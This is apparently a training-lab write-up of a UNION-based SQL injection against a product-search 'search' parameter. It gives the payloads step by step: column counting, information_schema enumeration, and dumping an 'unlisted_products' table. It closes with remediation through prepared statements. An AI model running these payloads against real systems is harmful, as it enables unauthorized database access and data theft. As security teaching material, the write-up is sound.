# 🔐 Task — UNION-Based SQL Injection: Find the Hidden Path

## 📌 Lab Overview

This lab demonstrates a **UNION-based SQL Injection** vulnerability in a product-search functionality.

The exercise focuses on the practical methodology of:

- Confirming SQL injection
- Determining the number of SQL columns
- Enumerating database metadata
- Identifying interesting tables
- Enumerating table columns
- Extracting records
- Identifying the hidden-path information


---

# 1. Vulnerability

The product-search functionality was vulnerable to **SQL Injection**.

The injectable parameter was the `search` parameter.

The application processes the supplied search value as part of an SQL query.

Testing the parameter with a single quote:

```sql
'
```

resulted in a database error.

This indicated that the supplied input was reaching the backend SQL query without being safely handled.

---

# 2. Objective

The objective was to use **UNION-based SQL Injection** to enumerate the database and identify the hidden path.

### Attack Workflow

```
Confirm SQL Injection
        ↓
Determine Number of Columns
        ↓
Enumerate Database Tables
        ↓
Identify unlisted_products
        ↓
Enumerate Its Columns
        ↓
Retrieve Table Data
        ↓
Identify Hidden-Path Information
```

---

# 3. Reconnaissance — Confirm SQL Injection


The initial test payload was:

```sql
'
```

The resulting database error indicated that the application was processing the supplied input as part of an SQL statement.

---

<img width="1275" height="650" alt="Screenshot 2026-09-17 at 2 29 58 PM" src="https://github.com/user-attachments/assets/7f70b6cc-7426-43cf-a7fc-f4d80f4c4b1a" />

<img width="1279" height="655" alt="Screenshot 2026-09-17 at 2 22 32 PM" src="https://github.com/user-attachments/assets/44d8ce15-086a-42d1-9a23-ea583cb4ac9b" />




# 4. Determine the Number of Columns

The next step was to determine how many columns were returned by the original SQL query.

The following payload was sent:

```sql
' UNION SELECT 1,2,3,4,5 -- //
```

<img width="1269" height="653" alt="Screenshot 2026-09-17 at 2 31 17 PM" src="https://github.com/user-attachments/assets/e39ee934-b130-4774-91fc-2ef9b55a7366" />



<img width="1265" height="644" alt="Screenshot 2026-09-17 at 2 31 34 PM" src="https://github.com/user-attachments/assets/d1a837c4-e40a-44fa-8ddd-4df924d53128" />




### Why?

A `UNION SELECT` statement generally needs to return the same number of columns as the original query.

The successful response indicated that the query could accept **five columns**.

---

# 5. Enumerate Database Tables

After determining the column count, database metadata was queried using `information_schema`.

### Payload

```sql
' UNION SELECT 1,2,table_schema,table_name,1
FROM information_schema.tables -- //
```

The important fields are:

| Field | Description |
| --- | --- |
| `table_schema` | Database/schema containing the table |
| `table_name` | Name of the table |

This allowed the available database tables to be enumerated.


<img width="1248" height="655" alt="Screenshot 2026-09-17 at 2 32 38 PM" src="https://github.com/user-attachments/assets/761ee7db-e38f-45f7-9bbf-3bcce1494ebf" />


---

# 6. Enumerate Tables and Columns in the Current Database

The next step was to examine the database structure more closely.

```sql
' UNION SELECT 1,2,table_schema,table_name,1
FROM information_schema.columns
WHERE table_schema=database() -- //
```

This query provides information about tables and their associated columns within the current database.


<img width="1271" height="654" alt="Screenshot 2026-09-17 at 2 33 56 PM" src="https://github.com/user-attachments/assets/b7632bd1-3e9e-4f4b-9507-ebeade036901" />

or 


```sql
' UNION SELECT 1,2,table_name,column_name,1
FROM information_schema.columns
WHERE table_schema=database() -- //
```


<img width="1263" height="654" alt="Screenshot 2026-09-17 at 2 37 27 PM" src="https://github.com/user-attachments/assets/d95dd5da-f23c-4f7b-86ac-e118ad6cebf8" />

---

# 7. Identify `unlisted_products`

During database enumeration, the following table was identified:

```
unlisted_products
```

The table was particularly relevant because its name suggested that it contained product information not exposed through the normal product-search functionality.

---

# 8. Enumerate `unlisted_products` Columns

To identify the exact column names, the following query was used:

```sql
' UNION SELECT 1,2,table_name,column_name,1
FROM information_schema.columns
WHERE table_schema=database()
  AND table_name='unlisted_products' -- //
```

This allowed the structure of `unlisted_products` to be identified.

<img width="1271" height="652" alt="Screenshot 2026-09-17 at 2 34 59 PM" src="https://github.com/user-attachments/assets/a1f1ec7e-4ba9-4789-ac39-acf14adc25b8" />

---

# 9. Extract Data from `unlisted_products` and Identify the Hidden Path

After identifying the table structure, its records could be retrieved using a five-column `UNION SELECT`:

```sql
' UNION SELECT description,id,price,product_name,product_type
FROM unlisted_products -- //
```

The returned records were then examined for information related to the lab objective.


<img width="1274" height="658" alt="Screenshot 2026-09-17 at 2 38 27 PM" src="https://github.com/user-attachments/assets/2c6b4bca-e7bd-46d4-8e76-63363b74d219" />


---




# 10. Key Learning

The most important lesson from this exercise is that **UNION-based SQL Injection is an enumeration process rather than a single payload**.

The general methodology is:

```
Injection Point
      ↓
Column Count
      ↓
Database
      ↓
Tables
      ↓
Columns
      ↓
Records
      ↓
Target Information
```



# 11. Lessons Learned

| Area | Lesson |
| --- | --- |
| SQL Injection | User input must never be trusted |
| UNION SQLi | Column count must be compatible |
| Enumeration | Database metadata can reveal schema information |
| Burp Suite | Repeater is useful for iterative testing |
| Database Security | Least privilege reduces potential impact |
| Secure Coding | Prepared statements are the primary defense |


## 🛡️ Remediation

The vulnerability should be fixed by replacing dynamically constructed SQL queries with **parameterized/prepared statements**.

Example conceptual implementation:

```
User Input
    ↓
Prepared SQL Statement
    ↓
Bound Parameter
    ↓
Database
```

This ensures that user-controlled values are treated as **data rather than executable SQL syntax**.

---

## 📚 Skills Demonstrated

```
✓ SQL Injection Detection
✓ UNION-Based SQL Injection
✓ SQL Query Manipulation
✓ Database Enumeration
✓ information_schema Enumeration
✓ Table Enumeration
✓ Column Enumeration
✓ Data Extraction
✓ Burp Suite Repeater
✓ Web Application Security Testing
✓ SQL Injection Mitigation
```

---

…
